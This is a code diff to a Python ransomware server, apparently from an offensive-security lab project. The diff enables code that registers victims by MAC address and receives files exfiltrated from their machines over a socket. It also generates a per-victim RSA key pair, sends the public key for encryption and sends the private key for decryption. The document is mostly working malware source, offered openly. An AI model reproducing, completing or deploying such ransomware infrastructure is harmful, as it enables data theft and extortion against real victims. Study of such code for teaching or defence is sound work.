@@ -13,8 +13,7 @@ import errno
 import time
 from getmac import get_mac_address
 import cryptowallet
-#from io import BytesIO
-#import rsa
+import rsa
 
 class Server:
     """ This class represents a server that stores some malicious payload and sends
@@ -27,7 +26,6 @@ class Server:
     VICTIMS = []
     WORKING_DIR = '/home/attacker/Lab-On-Offensive-Attack/VictimsData'
     CODE_PATH = '/home/attacker/Lab-On-Offensive-Attack/mal.py'
-    TRANSFER_DONE = False
 
   
 
@@ -35,6 +33,7 @@ class Server:
         self._port = port
         # Initialize the socket for connection using TCP protocol.
         self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._transfer_done = False
 
     @property
     def malicious_code(self):
@@ -73,19 +72,21 @@ class Server:
         path = os.path.join(Server.WORKING_DIR, dir_name)
         os.mkdir(path)
 
-    def generate_key_pair(self):
+    def generate_key_pair(self, vpath):
         public_key, private_key = rsa.newkeys(2048)
 
-        with open(os.path.join(Server.WORKING_DIR , 'public.pem'), 'wb') as f:
+        with open(os.path.join(vpath , 'public_key.pem'), 'wb') as f:
             f.write(public_key.save_pkcs1('PEM'))
 
-        with open(os.path.join(Server.WORKING_DIR, 'private.pem'), 'wb') as f:
+        with open(os.path.join(vpath, 'private_key.pem'), 'wb') as f:
             f.write(private_key.save_pkcs1('PEM'))
 
     def receive_victim_files(self, conn, mac):
         print("begin")
         path = os.path.join(Server.WORKING_DIR, mac)   
-        filename = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+        data = conn.recv(Server.MAX_SIZE)
+        print(data)
+        filename = base64.b64decode(data).decode(Server.FORMAT)
         print(filename)
         data_file = ""
         size = 0
@@ -106,13 +107,6 @@ class Server:
             conn.sendall(base64.b64encode("File data received.".encode(Server.FORMAT)))
             size+=len(data_file)
             print("size: "+str(size))
-
-        #except ValueError:
-            #with BytesIO(filename) as f:
-            #    file = open(str(f.name).split(chr(92))[-1], "w")
-            #    print(str(f.name).split(chr(92))[-1])
-            #    file.write(f.read())
-        #    return
 
         print("file data: "+data_file)
         conn.sendall(base64.b64encode("FILEDONE RECEIVED".encode(Server.FORMAT)))
@@ -151,6 +145,8 @@ class Server:
 
                 victim_mac = get_mac_address(ip=address[0])
 
+                victim_dir = os.path.join(Server.WORKING_DIR, victim_mac)
+
                 if victim_mac not in Server.VICTIMS:
                     Server.VICTIMS.append(victim_mac)
                     try:
@@ -161,20 +157,23 @@ class Server:
                         else:
                             raise
 
-                    #self.generate_key_pair()
+                    self.generate_key_pair(victim_dir)
                     
-                    #key_name = base64.b64encode('public.pem'.encode(SERVER.FORMAT))
-                    #connection.sendall(key_name)
+                    key_name = base64.b64encode('public_key.pem'.encode(Server.FORMAT))
+                    connection.sendall(key_name)
+                    msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+                    print("[CLIENT]: "+msg)
 
-                    # file = open(os.path.join(Server.WORKING_DIR, key_name), "rb")
-                    # key_data = file.read()
-                    #key = base64.b64encode(key_data.encode(SERVER.FORMAT))
+                    file = open(os.path.join(victim_dir, 'public_key.pem'), "rb")
+                    key_data = file.read()
+                    key = base64.b64encode(key_data)
+                    connection.sendall(key)
+                    msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+                    print("[CLIENT]: "+msg)
 
-                    #connection.sendall(key)
-
-                    while not self.TRANSFER_DONE:
+                    while not self._transfer_done:
                         self.receive_victim_files(connection, victim_mac)
-                        if self.TRANSFER_DONE == True:
+                        if self._transfer_done == True:
                             print("yessss")
                             break
                     break
@@ -186,24 +185,23 @@ class Server:
                 
                     # sends decryption key  
                     """ Opening and reading the private key file. """
-                    #file_path = os.path.join(Server.WORKING_DIR, victim_mac)
-                    #key_path = os.path.join(file_path, keyname)
+                    key_path = os.path.join(victim_dir, 'private_key.pem')
 
-                    #priv_key = open(file_path, "r")
-                    #data = priv_key.read()
+                    priv_key = open(key_path, "rb")
+                    data = priv_key.read()
 
                     """ Sending the filename to the server. """
-                    #self._socket.sendall(base64.b64encode(keyname.encode(Ransomware.ENCODING)))
-                    #msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
-                    #print(f"[CLIENT]: {msg}")
+                    self._socket.sendall(base64.b64encode('private_key.pem'.encode(Server.FORMAT)))
+                    msg = base64.b64decode(self._socket.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+                    print("[CLIENT]: "+msg)
 
                     """ Sending the file data to the server. """
-                    #self._socket.sendall(base64.b64encode(data.encode(Ransomware.ENCODING)))
-                    #msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
-                    #print(f"[CLIENT]: {msg}")
+                    self._socket.sendall(base64.b64encode(data.encode(Server.FORMAT)))
+                    msg = base64.b64decode(self._socket.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+                    print("[CLIENT]: "+msg)
         
                     """ Closing the file. """
-                    #file.close()         
+                    file.close()         
 
 
 if __name__ == '__main__':
